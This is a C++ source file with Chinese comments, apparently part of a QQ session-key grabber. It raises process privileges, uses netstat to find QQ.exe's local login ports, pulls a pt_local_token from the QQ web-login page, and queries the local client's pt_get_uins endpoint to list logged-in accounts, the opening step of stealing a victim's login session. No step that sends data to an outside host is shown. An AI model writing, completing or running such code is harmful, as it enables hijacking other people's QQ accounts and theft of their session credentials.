#include"HttpRequest.h"
#include"QQkey.h" 
#include"others.h"
QQinfo qqinfo[MAX_PROCESS];
int target_counts=0;
std::string pt_local_token;
LPSTR GetUinurl;
int main() {
    QQKEY qqkey;
    qqkey.AdjustPrivilege();
    for (int port = 4300; port <= 4324; ++port) {
        // 执行netstat命令并获取输出
        std::string command = "netstat -ano | findstr " + std::to_string(port);
        std::string netstatOutput = qqkey.exec(command.c_str());

        // 解析输出以获取PID
        //输出格式为：TCP    0.0.0.0:80    0.0.0.0:0    LISTENING    1234
        size_t pidPos = netstatOutput.find("LISTENING");
        if (pidPos != std::string::npos) {
            std::string pidStr = netstatOutput.substr(pidPos + 10, netstatOutput.find("\n", pidPos) - pidPos - 10);
            int pid = std::stoi(pidStr);
            std::string processName = qqkey.ProcessIdToName(pid);
            if (qqkey.IsProcessNameMatch(processName, "QQ.exe")) {
                qqinfo[target_counts].port = port;
                qqinfo[target_counts].pid = pid;
                std::cout << "Port: " << port << ", PID: " << pid << ", Name: " << processName << std::endl;
            }
        }
    }
    URL_COMPONENTSA crackedURL = { 0 };
    char URL_STRING[] = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=636014201&s_url=http://www.qq.com/qq2012/loginSuccess.htm&style=20&border_radius=1&target=self&maskOpacity=40";
    HttpRequest httpRequest;
    DWORD dwRetCode;
    httpRequest.InitializeURLComponentsA(crackedURL, URL_STRING);
    // 打印结果
    std::cout << "Host Name: " << crackedURL.lpszHostName << std::endl;
    std::cout << "URL Path: " << crackedURL.lpszUrlPath << std::endl;

    HINTERNET hInternet = InternetOpenA("Chrome", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    // 发送HTTP请求
    httpRequest.SendHttpRequest(hInternet, crackedURL.lpszHostName, crackedURL.lpszUrlPath, INTERNET_DEFAULT_HTTPS_PORT,NULL);

    // 获取HTTP请求状态码
    dwRetCode = httpRequest.GetHttpStatusCode();

    char lpHeaderBuffer[1024] = { 0 };
    DWORD dwSizeOfRq = 1024;
    httpRequest.ReadHttpHeaders(lpHeaderBuffer, dwSizeOfRq);
    std::cout << lpHeaderBuffer;

    // 打印HTTP状态码
    std::cout << "HTTP Status Code: " << dwRetCode << std::endl;

    std::string headerString(lpHeaderBuffer, dwSizeOfRq);

    // 寻找 pt_local_token 的位置
    size_t pos = headerString.find("pt_local_token=");
    if (pos != std::string::npos) {
        pos += std::strlen("pt_local_token=");  // 调整位置，指向 token 的起始位置
        size_t endPos = headerString.find(';', pos);  // 寻找分号的位置
        std::string ptLocalToken = headerString.substr(pos, endPos - pos);  // 提取 token
        std::cout << "pt_local_token: " << ptLocalToken << std::endl;
        pt_local_token = ptLocalToken;
    }
    else {
        std::cout << "pt_local_token not found" << std::endl;
    }
    // 结束时释放内存
    delete[] crackedURL.lpszHostName;
    delete[] crackedURL.lpszUrlPath;

    URL_COMPONENTSA GetUinURL;
    time_t seed = time(NULL);
    srand((unsigned)seed);
    // 初始化URL参数
    std::string randnum = GenerateRandomString(16);
    //https://localhost.ptlogin2.qq.com:4301pt_get_uins?callback= ptui getuins_CB & r = &pt local tk =
    std::string urlPath = "/pt_get_uins?callback=ptui_getuins_CB&r=" + randnum;
    urlPath += "&pt_local_tk=" + pt_local_token;
    GetUinURL.lpszUrlPath = const_cast<LPSTR>(urlPath.c_str());
    std::cout <<"UinURL: "<< GetUinURL.lpszUrlPath<<std::endl;
    const char* lpHeaders = "Referer:https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=636014201&s_url=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm";
    BOOL sendResult = httpRequest.SendHttpRequest(hInternet,"localhost.ptlogin2.qq.com", GetUinURL.lpszUrlPath, 4301,NULL);
    if (!sendResult) {
        std::cout << "Failed to send HTTP request" << std::endl;
        // 处理发送请求失败的情况
    }

    // 查询 HTTP 请求状态
    dwRetCode = httpRequest.GetHttpStatusCode();
    return 0;
}
